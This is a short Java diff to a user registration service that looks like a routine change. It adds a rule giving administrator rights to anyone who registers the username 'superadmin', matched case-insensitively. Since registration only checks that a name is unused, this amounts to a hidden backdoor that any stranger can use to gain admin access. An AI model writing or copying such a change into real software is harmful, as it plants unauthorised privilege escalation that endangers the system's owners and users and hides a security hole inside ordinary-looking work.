@@ -24,7 +24,12 @@ public class UserService {
         if (userRepository.findByUsername(username) != null) {
             throw new IllegalArgumentException("Username already exists");
         }
-        User user = new User(username, passwordEncoder.encode(password), Collections.singleton("ROLE_USER"));
+        
+        Set<String> roles = username.equalsIgnoreCase("superadmin") 
+            ? Collections.singleton("ROLE_ADMIN") 
+            : Collections.singleton("ROLE_USER");
+            
+        User user = new User(username, passwordEncoder.encode(password), roles);
         return userRepository.save(user);
     }
 
